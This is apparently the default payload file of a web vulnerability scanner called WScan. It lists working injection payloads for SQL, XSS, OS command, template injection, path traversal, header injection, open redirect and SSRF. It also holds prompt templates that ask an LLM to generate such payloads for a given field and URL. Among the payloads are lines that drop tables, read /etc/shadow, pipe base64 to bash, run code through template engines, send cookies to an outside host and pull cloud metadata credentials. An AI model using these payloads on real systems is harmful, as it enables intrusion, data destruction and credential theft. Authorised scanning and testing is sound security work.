# WScan Default Payloads
# These payloads are used when no custom payload file is specified
# and LLM generation is unavailable or disabled.

sqli:
  # ── Basic error probes ───────────────────────────────────────────
  - "'"
  - "''"
  - "\""
  - "\"'"
  - "`"
  - "\\'"
  # ── Classic OR-based bypass ──────────────────────────────────────
  - "' OR '1'='1"
  - "' OR '1'='1' --"
  - "' OR '1'='1' /*"
  - "' OR '1'='1' #"
  - "\" OR \"1\"=\"1"
  - "\" OR \"1\"=\"1\"--"
  - ") OR ('1'='1"
  - ") OR 1=1--"
  - "1 OR 1=1"
  - "1 OR 1=1--"
  - "admin'--"
  - "admin' #"
  - "admin'/*"
  - "' OR 1=1--"
  - "' OR 1=1#"
  - "' OR 1=1/*"
  # ── UNION-based ──────────────────────────────────────────────────
  - "' UNION SELECT NULL--"
  - "' UNION SELECT NULL,NULL--"
  - "' UNION SELECT NULL,NULL,NULL--"
  - "-1 UNION SELECT 1,2,3--"
  - "1' UNION ALL SELECT NULL,NULL,NULL--"
  - "' UNION SELECT @@version,NULL--"
  - "' UNION SELECT user(),NULL--"
  - "1 UNION SELECT 1,username,password FROM users--"
  - "' UNION SELECT table_name,NULL FROM information_schema.tables--"
  # ── ORDER BY (column count detection) ───────────────────────────
  - "1' ORDER BY 1--"
  - "1' ORDER BY 2--"
  - "1' ORDER BY 3--"
  - "1' ORDER BY 5--"
  - "1' ORDER BY 10--"
  # ── Boolean-based blind ──────────────────────────────────────────
  - "1' AND '1'='1"
  - "1' AND '1'='2"
  - "1 AND 1=1"
  - "1 AND 1=2"
  - "1' AND SUBSTRING(username,1,1)='a'--"
  - "1' AND LENGTH(password)>0--"
  # ── Time-based blind ─────────────────────────────────────────────
  - "1' AND SLEEP(3)--"
  - "1 AND SLEEP(3)"
  - "'; WAITFOR DELAY '0:0:3'--"
  - "1; WAITFOR DELAY '0:0:3'--"
  - "1' AND BENCHMARK(5000000,MD5('a'))--"
  - "1' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)--"
  - "1; SELECT pg_sleep(3)--"
  - "1' OR SLEEP(3)--"
  # ── Stacked queries ───────────────────────────────────────────────
  - "'; DROP TABLE users--"
  - "'; INSERT INTO users(username,password) VALUES('wscan','wscan')--"
  - "1; SELECT * FROM information_schema.tables--"
  # ── Error-based (MySQL) ───────────────────────────────────────────
  - "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--"
  - "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--"
  - "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
  - "1 AND EXTRACTVALUE(0,CONCAT(0x0a,(SELECT database())))--"
  # ── Error-based (MSSQL) ───────────────────────────────────────────
  - "' AND 1=CONVERT(int,@@version)--"
  - "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--"
  # ── Error-based (Oracle) ──────────────────────────────────────────
  - "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--"
  - "' OR 1=UTL_HTTP.REQUEST('http://x')--"
  # ── WAF bypass — inline comments ─────────────────────────────────
  - "' /*!UNION*/ /*!SELECT*/ NULL--"
  - "'/**/OR/**/1=1--"
  - "' OR/**/ 1=1--"
  - "' /*!50000OR*/ 1=1--"
  - "1'%09OR%091=1--"
  - "1' OR%0a1=1--"
  # ── WAF bypass — case variation ───────────────────────────────────
  - "' UniOn SeLeCt NULL--"
  - "' uNiOn aLl sElEcT NULL--"
  # ── WAF bypass — double URL encoding ─────────────────────────────
  - "%2527%20OR%25201%3D1--"
  - "%27%20OR%20%271%27%3D%271"
  # ── WAF bypass — hex-encoded strings (MySQL) ─────────────────────
  - "' OR username=0x61646d696e--"
  - "' UNION SELECT 0x61646d696e,0x70617373776f7264--"
  # ── WAF bypass — space alternatives ─────────────────────────────
  - "'%0aOR%0a'1'='1"
  - "'%0bOR%0b1=1--"
  - "'+OR+1=1--"
  - "1'/**/AND/**/SLEEP(3)--"
  # ── WAF bypass — scientific notation (MySQL) ─────────────────────
  - "1e0 UNION SELECT NULL--"
  - "1.0 UNION SELECT NULL--"
  # ── Second-order / out-of-band markers ───────────────────────────
  - "1' AND LOAD_FILE('/etc/passwd')--"
  - "' INTO OUTFILE '/tmp/wscan_test.txt'--"
  # ── NoSQL (MongoDB-style JSON injection) ──────────────────────────
  - "{\"$gt\":\"\"}"
  - "{\"$ne\":null}"
  - "{\"$regex\":\".*\"}"
  - "'; return db.getCollectionNames();//"
  - "\" || 1==1//"

xss:
  # ── Basic script injection ────────────────────────────────────────
  - "<script>alert('XSS')</script>"
  - "<script>alert(document.cookie)</script>"
  - "<script>alert(1)</script>"
  - "<script>alert(document.domain)</script>"
  # ── Attribute injection ───────────────────────────────────────────
  - "\"'><script>alert('XSS')</script>"
  - "'\"><script>alert('XSS')</script>"
  - "'><img src=x onerror=alert('XSS')>"
  - "\"><img src=x onerror=alert(1)>"
  # ── img / svg / video event handlers ─────────────────────────────
  - "<img src=x onerror=alert('XSS')>"
  - "<img src=x onerror=\"alert('XSS')\">"
  - "<img src=1 onerror=alert(1)>"
  - "<svg onload=alert('XSS')>"
  - "<svg onload=\"alert('XSS')\">"
  - "<svg><script>alert(1)</script></svg>"
  - "<video src=x onerror=alert(1)>"
  - "<audio src=x onerror=alert(1)>"
  - "<body onload=alert('XSS')>"
  - "<input autofocus onfocus=alert('XSS')>"
  - "<details open ontoggle=alert('XSS')>"
  - "<select autofocus onfocus=alert('XSS')>"
  - "<textarea autofocus onfocus=alert('XSS')>"
  - "<keygen autofocus onfocus=alert('XSS')>"
  - "<marquee onstart=alert('XSS')>"
  # ── SVG advanced ─────────────────────────────────────────────────
  - "<svg><animate onbegin=alert(1) attributeName=x></svg>"
  - "<svg><set attributeName=onmouseover value=alert(1)></svg>"
  - "<svg/onload=alert(1)>"
  - "<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x\"></use></svg>"
  # ── JavaScript protocol ───────────────────────────────────────────
  - "javascript:alert('XSS')"
  - "JAVASCRIPT:alert('XSS')"
  - "javascript:alert`XSS`"
  - "java&#x0D;&#x0A;script:alert(1)"
  - "j&#x61;v&#x61;script:alert(1)"
  # ── IFrame ────────────────────────────────────────────────────────
  - "<iframe src=javascript:alert('XSS')>"
  - "<iframe onload=alert('XSS')>"
  - "<iframe srcdoc=\"<script>alert(1)</script>\">"
  # ── Template / framework injection ───────────────────────────────
  - "{{constructor.constructor('alert(1)')()}}"
  - "${alert(1)}"
  - "#{alert(1)}"
  # ── Filter bypass — encoding ──────────────────────────────────────
  - "<<SCRIPT>alert('XSS');//<</SCRIPT>"
  - "<IMG SRC=j&#X41;vascript:alert('XSS')>"
  - "<IMG SRC=\"jav\tascript:alert('XSS');\">"
  - "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">"
  - "%3Cscript%3Ealert('XSS')%3C/script%3E"
  - "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;"
  - "&#60;script&#62;alert(1)&#60;/script&#62;"
  - "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e"
  # ── Double URL encoded ────────────────────────────────────────────
  - "%253Cscript%253Ealert(1)%253C/script%253E"
  - "%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E"
  # ── JS hex / unicode escape in event handler ─────────────────────
  - "<img src=x onerror=\\x61lert(1)>"
  - "<img src=x onerror=\\u0061lert(1)>"
  - "<svg onload=\\x61lert(1)>"
  # ── HTML entity in javascript: URI ───────────────────────────────
  - "java&#x73;cript:alert(1)"
  - "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)"
  # ── mXSS (mutation-based XSS) ────────────────────────────────────
  - "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">"
  - "<listing><img src=x onerror=alert(1)></listing>"
  - "<xmp><img src=x onerror=alert(1)></xmp>"
  # ── CSP bypass — nonce-less gadgets ──────────────────────────────
  - "<link rel=preload as=script href=//x.com/x.js>"
  - "<meta http-equiv=refresh content=\"0;url=javascript:alert(1)\">"
  # ── Filter bypass — null byte / slash variants ────────────────────
  - "<scr\0ipt>alert('XSS')</scr\0ipt>"
  - "<scr%00ipt>alert('XSS')</scr%00ipt>"
  - "<sc<!---->ript>alert('XSS')</sc<!---->ript>"
  - "<SCRIPT/SRC=x>alert(1)</SCRIPT>"
  # ── DOM XSS probes ────────────────────────────────────────────────
  - "#<script>alert('XSS')</script>"
  - "';alert('XSS');//"
  - "\";alert('XSS');//"
  - "'-alert(1)-'"
  - "\"-alert(1)-\""
  # ── Polyglot (HTML + JS + attribute context) ──────────────────────
  - "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"
  - "'\"`><svg onload=alert(1)>/*"
  - "\"><img src=x onerror=alert(1)><!--"
  - "</script><script>alert(1)</script>"
  # ── CSS injection / expression ────────────────────────────────────
  - "<style>@import'javascript:alert(1)'</style>"
  - "<div style=\"background:url(javascript:alert(1))\">"
  # ── Stored XSS with external load ────────────────────────────────
  - "<script src=//x.com/x.js></script>"
  - "<img src=x onerror=\"this.src='//x.com/'+document.cookie\">"

os:
  # ── Unix / Linux basic ────────────────────────────────────────────
  - "; ls -la"
  - "| ls -la"
  - "& ls -la"
  - "&& ls -la"
  - "; whoami"
  - "| whoami"
  - "& whoami"
  - "&& whoami"
  - "; id"
  - "| id"
  - "; cat /etc/passwd"
  - "| cat /etc/passwd"
  - "; cat /etc/shadow"
  - "| cat /etc/shadow"
  - "; uname -a"
  - "| uname -a"
  - "; env"
  - "| env"
  - "; printenv"
  - "; hostname"
  - "; ifconfig"
  - "; netstat -an"
  - "; ps aux"
  # ── Windows ───────────────────────────────────────────────────────
  - "; dir"
  - "| dir"
  - "& dir"
  - "&& dir"
  - "| type C:\\Windows\\win.ini"
  - "& type C:\\Windows\\win.ini"
  - "; ipconfig"
  - "| ipconfig"
  - "| net user"
  - "& systeminfo"
  - "; cmd /c whoami"
  # ── Command substitution ──────────────────────────────────────────
  - "`whoami`"
  - "$(whoami)"
  - "`id`"
  - "$(id)"
  - "`cat /etc/passwd`"
  - "$(cat /etc/passwd)"
  - "`uname -a`"
  # ── Newline injection ─────────────────────────────────────────────
  - "\n whoami"
  - "\r\n whoami"
  - "%0a whoami"
  - "%0d%0a whoami"
  # ── Blind (time-based) ────────────────────────────────────────────
  - "; ping -c 3 127.0.0.1"
  - "| ping -c 3 127.0.0.1"
  - "& ping -n 3 127.0.0.1"
  - "; sleep 3"
  - "| sleep 3"
  - "$(sleep 3)"
  - "`sleep 3`"
  - "; timeout 3"
  # ── IFS / whitespace bypass ───────────────────────────────────────
  - ";${IFS}whoami"
  - "|${IFS}id"
  - ";{cat,/etc/passwd}"
  - ";cat${IFS}/etc/passwd"
  - ";ca''t${IFS}/etc/passwd"
  # ── Semicolon-less separators ─────────────────────────────────────
  - "||whoami"
  - "||id||"
  - "&&whoami&&"
  # ── Base64-encoded command ────────────────────────────────────────
  - "| bash -c 'echo d2hvYW1p|base64 -d|bash'"
  - ";echo${IFS}d2hvYW1p|base64${IFS}-d|bash"
  # ── Environment variable exfil markers ───────────────────────────
  - "; echo $PATH"
  - "| echo $HOME"
  - "| echo $USER"
  # ── URL-encoded separator WAF bypass ─────────────────────────────
  - "%3bwhoami"
  - "%7cwhoami"
  - "%0awhoami"
  - "%0d%0awhoami"
  # ── IFS / brace expansion (space-free) ───────────────────────────
  - ";{cat,/etc/passwd}"
  - ";{id,}"
  - ";$IFS$(id)"
  - "|${IFS}cat${IFS}/etc/passwd"
  # ── Base64-encoded commands ───────────────────────────────────────
  - ";bash<<<$(echo d2hvYW1p|base64 -d)"
  - ";echo${IFS}Y2F0IC9ldGMvcGFzc3dk|base64${IFS}-d|bash"
  # ── Wildcard / glob trick ─────────────────────────────────────────
  - ";/???/??t /???/p?sswd"
  - ";/usr/bin/wh??ami"
  # ── Python / Perl one-liner fallback ─────────────────────────────
  - ";python3 -c 'import os;os.system(\"id\")'"
  - ";perl -e 'system(\"id\")'"

ssti:
  # ── Generic math probes (engine-agnostic) ────────────────────────
  - "{{7*7}}"
  - "${7*7}"
  - "<%= 7*7 %>"
  - "#{7*7}"
  - "{{7*'7'}}"
  - "*{7*7}"
  - "%{7*7}"
  - "[[${7*7}]]"
  # ── Jinja2 / Twig / Flask ─────────────────────────────────────────
  - "{{config}}"
  - "{{config.items()}}"
  - "{{self.__dict__}}"
  - "{{request}}"
  - "{{request.environ}}"
  - "{{''.__class__.__mro__[1].__subclasses__()}}"
  - "{{''.__class__.__mro__[2].__subclasses__()}}"
  - "{{7*7}}{{config}}"
  - "{% debug %}"
  - "{% for key, value in config.items() %}{{ key }}:{{ value }}\n{% endfor %}"
  # ── Jinja2 RCE probes ─────────────────────────────────────────────
  - "{{''.__class__.__mro__[1].__subclasses__()[408]('id',shell=True,stdout=-1).communicate()[0].strip()}}"
  - "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}"
  # ── Twig ──────────────────────────────────────────────────────────
  - "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}"
  - "{{_self.env.getFilter(\"id\")}}"
  - "{{['id']|filter('system')}}"
  # ── Smarty (PHP) ──────────────────────────────────────────────────
  - "{php}echo shell_exec('id');{/php}"
  - "{system('id')}"
  - "{if system('id')}{/if}"
  # ── FreeMarker (Java) ─────────────────────────────────────────────
  - "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"
  - "${\"freemarker.template.utility.Execute\"?new()(\"id\")}"
  - "[#assign ex = 'freemarker.template.utility.Execute'?new()]${ex('id')}"
  # ── Velocity (Java) ───────────────────────────────────────────────
  - "#set($str=$class.inspect(\"java.lang.String\").type)"
  - "#set($x=$str.format('${'+'#set($x=1)'+'}'))"
  # ── Mako / Cheetah (Python) ──────────────────────────────────────
  - "${__import__('os').popen('id').read()}"
  - "<%\nimport os\nx=os.popen('id').read()\n%>${x}"
  # ── Expression Language (Spring / Java EE) ───────────────────────
  - "${7*7}"
  - "T(java.lang.Runtime).getRuntime().exec('id')"
  - "${T(java.lang.System).getenv()}"
  - "#{T(java.lang.Runtime).getRuntime().exec('id')}"
  # ── Pebble (Java) ────────────────────────────────────────────────
  - "{%set cmd = 'id'%}{{cmd}}"
  - "{{ '' | upper }}"

header_injection:
  # ── CRLF injection ────────────────────────────────────────────────
  - "\r\nX-WscanHdrInject: 1"
  - "%0d%0aX-WscanHdrInject:%201"
  - "%0aX-WscanHdrInject:%201"
  - "\nX-WscanHdrInject: 1"
  - "%0d%0a%20X-WscanHdrInject:%201"
  - "\r\nSet-Cookie: wscan_session=injected; Path=/"
  - "%0d%0aSet-Cookie:%20wscan_session=injected"
  # ── Response splitting ────────────────────────────────────────────
  - "\r\n\r\n<html><body>WSCAN_SPLIT</body></html>"
  - "%0d%0a%0d%0a<script>alert(1)</script>"
  # ── Email header injection ────────────────────────────────────────
  - "test@example.com\r\nBcc: wscan@attacker.com"
  - "test@example.com%0aCC:wscan@attacker.com"
  - "test@example.com\nSubject: injected_subject"
  # ── Host header injection ─────────────────────────────────────────
  - "evil.com"
  - "localhost"

path_traversal:
  # ── Unix — /etc/passwd ────────────────────────────────────────────
  - "../../../etc/passwd"
  - "../../etc/passwd"
  - "../etc/passwd"
  - "../../../../etc/passwd"
  - "../../../../../etc/passwd"
  # ── URL-encoded ───────────────────────────────────────────────────
  - "..%2F..%2F..%2Fetc%2Fpasswd"
  - "..%2f..%2f..%2fetc%2fpasswd"
  - "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
  - "%252e%252e%252fetc%252fpasswd"
  - "%252e%252e%252f%252e%252e%252fetc%252fpasswd"
  # ── Double-encoded ────────────────────────────────────────────────
  - "..%255c..%255c..%255cetc%255cpasswd"
  - "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
  - "..%c1%9c..%c1%9cetc%c1%9cpasswd"
  # ── Dot-dot-slash tricks ──────────────────────────────────────────
  - "....//....//....//etc//passwd"
  - "....\\\\....\\\\....\\\\etc\\\\passwd"
  - "..\\/..\\/..\\/etc\\/passwd"
  # ── Null byte injection ───────────────────────────────────────────
  - "../../../etc/passwd%00"
  - "../../../etc/passwd%00.png"
  - "../../../etc/passwd\x00"
  # ── Unix — other sensitive files ──────────────────────────────────
  - "../../../etc/hosts"
  - "../../../etc/shadow"
  - "../../../etc/group"
  - "../../../proc/self/environ"
  - "../../../proc/version"
  - "../../../var/log/apache2/access.log"
  - "../../../var/log/nginx/access.log"
  - "../../../../../../var/www/html/index.php"
  # ── Windows ───────────────────────────────────────────────────────
  - "..\\..\\..\\windows\\win.ini"
  - "..%5C..%5C..%5Cwindows%5Cwin.ini"
  - "..%5c..%5c..%5cwindows%5cwin.ini"
  - "../../../../boot.ini"
  - "..%2F..%2F..%2F..%2Fboot.ini"
  - "C:\\Windows\\win.ini"
  - "C:/Windows/win.ini"
  # ── Absolute path bypass ──────────────────────────────────────────
  - "/etc/passwd"
  - "/etc/shadow"
  - "/proc/self/environ"

open_redirect:
  - "//evil.com"
  - "https://evil.com"
  - "//evil.com/%2f.."
  - "/\\evil.com"
  - "///evil.com"
  - "////evil.com"
  - "https:evil.com"
  - "https://evil.com/fake"
  - "//google.com@evil.com"
  - "javascript:alert(1)"
  - "%2F%2Fevil.com"
  - "%5C%5Cevil.com"
  - "\tevil.com"
  - "\nevil.com"

ssrf:
  # ── Cloud metadata endpoints ──────────────────────────────────────────
  - "http://169.254.169.254/latest/meta-data/"
  - "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  - "http://metadata.google.internal/computeMetadata/v1/"
  - "http://169.254.169.254/metadata/instance"
  # ── Internal services ─────────────────────────────────────────────────
  - "http://localhost/"
  - "http://127.0.0.1/"
  - "http://[::1]/"
  - "http://0.0.0.0/"
  # ── File read via file:// ─────────────────────────────────────────────
  - "file:///etc/passwd"
  - "file:///etc/hosts"
  - "file:///proc/self/environ"
  # ── Internal port scan probes ─────────────────────────────────────────
  - "http://127.0.0.1:22/"
  - "http://127.0.0.1:3306/"
  - "http://127.0.0.1:6379/"

# LLM prompt templates for context-aware payload generation
llm_prompts:
  sqli: |
    You are an expert web application penetration tester specializing in SQL injection.
    Generate SQL injection payloads for a field named "{field_name}" at "{url}".

    Field context: infer the field's role from its name.
    - login/user/email/pass → prioritize auth bypass (OR 1=1, admin'--)
    - id/num/page → integer injection (no quotes needed)
    - search/q/query → UNION-based, error-based
    - order/sort → ORDER BY injection

    Generate exactly 12 diverse payloads covering ALL of these categories:
    1. Syntax error probe: single quote, double quote, backtick
    2. Auth bypass: OR '1'='1, admin'--
    3. UNION column count detection: UNION SELECT NULL,NULL--
    4. Boolean blind: AND 1=1 vs AND 1=2
    5. Time-based blind: SLEEP(3), WAITFOR DELAY '0:0:3', pg_sleep(3)
    6. Error-based MySQL: EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))
    7. Error-based MSSQL: CONVERT(int,@@version)
    8. WAF bypass via inline comments: '/**/OR/**/1=1--
    9. WAF bypass via URL encoding: %27%20OR%20%271%27%3D%271
    10. WAF bypass via hex string: ' OR username=0x61646d696e--
    11. WAF bypass via space alternative: '||'1'='1 (pipe concat, Oracle)
    12. Stacked queries / OOB: '; SELECT 1--

    Output ONLY a valid JSON array of strings. No prose, no numbers, no markdown fences.
    Example: ["'", "' OR '1'='1'--", "1 UNION SELECT NULL--", "'/**/OR/**/1=1--"]

  xss: |
    You are an expert web application penetration tester specializing in XSS.
    Generate XSS payloads for a field named "{field_name}" at "{url}".

    Field context: infer the injection context from the field name.
    - search/q/query → likely reflected into HTML body (use <script>, <img onerror=)
    - name/title/comment → may be stored; use short robust payloads
    - url/href/src → attribute context; use javascript: or data: URI
    - style/css → CSS injection: expression(), -moz-binding

    Generate exactly 12 diverse payloads covering:
    1. Basic script tag: <script>alert(1)</script>
    2. Event handler on img: <img src=x onerror=alert(1)>
    3. SVG with onload: <svg onload=alert(1)>
    4. Attribute injection: " onmouseover="alert(1)
    5. JavaScript URI: javascript:alert(document.cookie)
    6. HTML5 autofocus: <input autofocus onfocus=alert(1)>
    7. eval+atob bypass: <script>eval(atob('YWxlcnQoMSk='))</script>
    8. HTML entity bypass: <scr&#105;pt>alert(1)</scr&#105;pt>
    9. URL encoded: %3Cscript%3Ealert(1)%3C/script%3E
    10. Double URL encoded: %253Cscript%253Ealert(1)%253C/script%253E
    11. JS hex escape in handler: <img src=x onerror=\x61lert(1)>
    12. Polyglot: "><svg/onload=alert(1)><!--

    Output ONLY a valid JSON array of strings. No prose, no numbers, no markdown fences.
    Example: ["<script>alert(1)</script>", "%253Cscript%253Ealert(1)%253C%2Fscript%253E"]

  os: |
    You are an expert web application penetration tester specializing in OS command injection.
    Generate OS command injection payloads for a field named "{field_name}" at "{url}".

    Field context: infer from field name.
    - filename/file/path → path-based injection
    - host/ip/server/ping → network command injection
    - cmd/exec/command → direct command injection

    Generate exactly 12 diverse payloads for BOTH Unix and Windows:
    1. Unix chained: ; id
    2. Unix pipe: | id
    3. Unix AND: && id
    4. Unix subshell: $(id)
    5. Unix backtick: `id`
    6. Windows chained: & whoami
    7. Blind Unix time-based: ; sleep 3
    8. Blind Windows time-based: & ping -n 3 127.0.0.1
    9. URL-encoded separator: %3bid  (semicolon URL encoded)
    10. IFS bypass (no space): ;${IFS}id
    11. Brace expansion (no space): ;{id,}
    12. Base64 encoded command: ;bash<<<$(echo d2hvYW1p|base64 -d)

    Prioritize Unix payloads if the URL path looks like a Linux app.
    Output ONLY a valid JSON array of strings. No prose, no numbers, no markdown fences.
    Example: ["; id", "%3bid", ";${IFS}id", ";{cat,/etc/passwd}"]

  ssti: |
    You are an expert penetration tester specializing in Server-Side Template Injection (SSTI).
    Generate SSTI detection payloads for a field named "{field_name}" at "{url}".

    Generate exactly 10 payloads targeting different template engines:
    1. Jinja2/Twig math: {{7*7}}
    2. Jinja2/Twig string: {{7*'7'}}
    3. Jinja2 config dump: {{config}}
    4. Mako: ${7*7}
    5. ERB (Ruby): <%= 7*7 %>
    6. SpEL (Spring): *{7*7}
    7. OGNL (Struts): %{7*7}
    8. Thymeleaf: [[${7*7}]]
    9. Pebble/Velocity: #{7*7}
    10. FreeMarker: ${7*7?c}

    Expected output for math probes: 49. For string probe: 7777777.
    Output ONLY a valid JSON array of strings. No prose, no numbers, no markdown fences.

  path_traversal: |
    You are an expert penetration tester specializing in path traversal / LFI.
    Generate path traversal payloads for a field named "{field_name}" at "{url}".

    Generate exactly 12 diverse payloads using MULTIPLE encoding techniques:
    1. Basic Unix: ../../../etc/passwd
    2. Basic Windows: ..\..\..\windows\win.ini
    3. Single URL encoded: ..%2F..%2F..%2Fetc%2Fpasswd
    4. Double URL encoded: ..%252F..%252F..%252Fetc%252Fpasswd
    5. Triple URL encoded: ..%25252F..%25252Fetc%25252Fpasswd
    6. UTF-8 overlong slash: ..%c0%af..%c0%afetc%c0%afpasswd
    7. Strip bypass (../  removed once): ....//....//....//etc//passwd
    8. Null byte: ../../../etc/passwd%00
    9. Absolute Unix: /etc/passwd
    10. Proc self environ: /proc/self/environ
    11. Windows double encoded: ..%255c..%255c..%255cwindows%255cwin.ini
    12. Deep traversal: ../../../../../../../../etc/passwd

    Output ONLY a valid JSON array of strings. No prose, no numbers, no markdown fences.

  header_injection: |
    You are an expert penetration tester specializing in HTTP header injection.
    Generate header injection payloads for a field named "{field_name}" at "{url}".

    Generate exactly 10 payloads using CRLF (\r\n) and encoding variants:
    1. Basic CRLF: value%0d%0aSet-Cookie:injected=1
    2. LF only: value%0aX-Injected:true
    3. Double CRLF (response split): value%0d%0a%0d%0a<html>injected</html>
    4. URL encoded CR+LF: value%0D%0ALocation:http://evil.com
    5. Double URL encoded: value%250d%250aSet-Cookie:x=1
    6. Unicode LF: value\u000aSet-Cookie:x=1
    7. Location redirect: value%0d%0aLocation:http://example.com
    8. XSS via header split: value%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>
    9. Cache poisoning: value%0d%0aX-Forwarded-Host:evil.com
    10. Cookie injection: value%0d%0aSet-Cookie:admin=1;Path=/

    Output ONLY a valid JSON array of strings. No prose, no numbers, no markdown fences.

  open_redirect: |
    You are an expert penetration tester specializing in open redirect vulnerabilities.
    Generate open redirect payloads for a field named "{field_name}" at "{url}".

    Generate exactly 12 diverse payloads using URL tricks and encoding:
    1. Basic HTTPS: https://evil.com
    2. Protocol-relative: //evil.com
    3. Triple slash: ///evil.com
    4. Backslash: /\evil.com
    5. URL encoded slash: %2F%2Fevil.com
    6. Double URL encoded: %252F%252Fevil.com
    7. @-sign bypass: https://trusted.com@evil.com
    8. Newline bypass: %0ahttps://evil.com
    9. Tab bypass: %09https://evil.com
    10. Decimal IP of evil (for demonstration): http://2130706433/evil
    11. Data URI XSS: data:text/html,<script>alert(1)</script>
    12. javascript: URI: javascript:alert(document.cookie)

    Output ONLY a valid JSON array of strings. No prose, no numbers, no markdown fences.

  ssrf: |
    You are an expert penetration tester specializing in SSRF.
    Generate SSRF payloads for a field named "{field_name}" at "{url}".

    Generate exactly 12 diverse payloads targeting internal services and using bypass techniques:
    1. AWS metadata: http://169.254.169.254/latest/meta-data/
    2. GCP metadata: http://metadata.google.internal/computeMetadata/v1/
    3. Azure IMDS: http://169.254.169.254/metadata/instance
    4. Localhost HTTP: http://127.0.0.1/
    5. IPv6 loopback: http://[::1]/
    6. File read: file:///etc/passwd
    7. Internal DB port: http://127.0.0.1:6379/  (Redis)
    8. Decimal IP bypass: http://2130706433/  (127.0.0.1)
    9. Octal IP bypass: http://0177.0.0.1/  (127.0.0.1)
    10. DNS rebinding: http://localtest.me/
    11. URL encoded: http://%31%32%37%2e%30%2e%30%2e%31/
    12. HTTPS variant: https://169.254.169.254/latest/meta-data/

    Output ONLY a valid JSON array of strings. No prose, no numbers, no markdown fences.
